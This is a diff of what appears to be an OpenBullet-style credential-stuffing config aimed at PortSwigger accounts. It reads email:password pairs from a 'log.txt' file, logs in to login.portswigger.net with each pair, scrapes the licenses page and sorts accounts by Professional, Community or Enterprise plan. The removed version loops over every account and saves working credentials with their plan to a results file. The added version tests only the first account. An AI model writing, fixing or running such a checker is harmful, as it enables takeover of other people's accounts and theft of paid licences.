@@ -1,86 +1,54 @@
 ## PortSwigger Subscription Extraction
 ## Reads accounts from log.txt and extracts subscription information
-## Processes all accounts and outputs paid subscriptions
+## Fixed variable substitution in form data: uses <email> and <password> syntax
 
 FileReadLines "log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
-## Create label for loop iteration
-#PROCESS_ACCOUNT
+## Extract first account for testing
+SET VAR "account" $"<accounts[0]>"
+Split $"<account>" ":" -> VAR "creds"
+SET VAR "email" $"<creds[0]>"
+SET VAR "password" $"<creds[1]>"
 
-## Get total account count using JavaScript
-BEGIN SCRIPT Jint
-  var count = "accounts".split('\n').length;
-  return Math.max(0, count - 1);
-END SCRIPT -> VARS "totalAccounts"
+PRINT "Testing account: <email>" White
 
-## Initialize counter and results storage
-SET VAR "accountIndex" "0" Integer
-SET VAR "successCount" "0" Integer
+## Step 1: GET login page
+HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
+SET VAR "loginPageRes" $"<SOURCE>"
+PRINT "✓ Fetched login page" White
 
-## Initialize results file
-FileWrite "Configs\extraction_results.txt" "email:password:plan"
+## Step 2: POST login credentials with form data containing email and password
+## KEY FIX: Use <email> and <password> literal syntax for variable substitution
+HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
+  CONTENT "username=<email>&password=<password>&action=default"
+  CONTENTTYPE "application/x-www-form-urlencoded"
+SET VAR "loginRes" $"<SOURCE>"
+PRINT "✓ Posted credentials" White
 
-## Process each account
-IF $"<accountIndex>" LessThan $"<accounts[*]>"
-  ## Extract account credentials
-  SET VAR "account" $"<accounts[<accountIndex>]>"
-  Split $"<account>" ":" -> VAR "creds"
-  SET VAR "email" $"<creds[0]>"
-  SET VAR "password" $"<creds[1]>"
+## Step 3: GET licenses page (cookies preserved from login)
+HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
+SET VAR "licensesRes" $"<SOURCE>"
+PRINT "✓ Fetched licenses page" White
 
-  PRINT "[<accountIndex>] Processing: <email>" White
+## Check for subscription types
+SET VAR "plan" ""
 
-  ## Step 1: GET login page
-  HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True
-  SET VAR "loginPageRes" $"<SOURCE>"
-
-  ## Step 2: POST login credentials
-  HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True
-    CONTENT "username=<email>&password=<password>&action=default"
-    CONTENTTYPE "application/x-www-form-urlencoded"
-  SET VAR "loginRes" $"<SOURCE>"
-
-  ## Step 3: GET licenses page
-  HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True
-  SET VAR "licensesRes" $"<SOURCE>"
-
-  ## Extract subscription plan
-  SET VAR "plan" ""
-
-  IF $"<licensesRes>" Contains "Professional"
-    SET VAR "plan" "Professional"
+IF $"<licensesRes>" Contains "Professional"
+  SET VAR "plan" "Professional"
+  PRINT "FOUND: <email> - Professional" Green
+ELSE
+  IF $"<licensesRes>" Contains "Community"
+    SET VAR "plan" "Community"
+    PRINT "FOUND: <email> - Community" Green
   ELSE
-    IF $"<licensesRes>" Contains "Community"
-      SET VAR "plan" "Community"
+    IF $"<licensesRes>" Contains "Enterprise"
+      SET VAR "plan" "Enterprise"
+      PRINT "FOUND: <email> - Enterprise" Green
     ELSE
-      IF $"<licensesRes>" Contains "Enterprise"
-        SET VAR "plan" "Enterprise"
-      ENDIF
+      PRINT "NO: <email> - No paid subscription" Yellow
     ENDIF
   ENDIF
-
-  ## Write result if paid subscription found
-  IF $"<plan>" NotEqualTo ""
-    FileAppendLines "Configs\extraction_results.txt"
-      "<email>:<password>:<plan>"
-    SUM $"<successCount>" -> VAR "successCount"
-    PRINT "✓ <email> - <plan>" Green
-  ELSE
-    PRINT "✗ <email> - no paid plan" Yellow
-  ENDIF
-
-  ## Increment counter
-  SUM $"<accountIndex>" -> VAR "accountIndex"
-
-  ## Add delay between requests
-  Delay 500
-
-  ## Jump back to loop if more accounts remain
-  IF $"<accountIndex>" LessThan $"<accounts[*]>"
-    JUMP #PROCESS_ACCOUNT
-  ENDIF
-
 ENDIF
 
-PRINT "Done: <successCount> paid accounts extracted" Green
+PRINT "Test complete" White
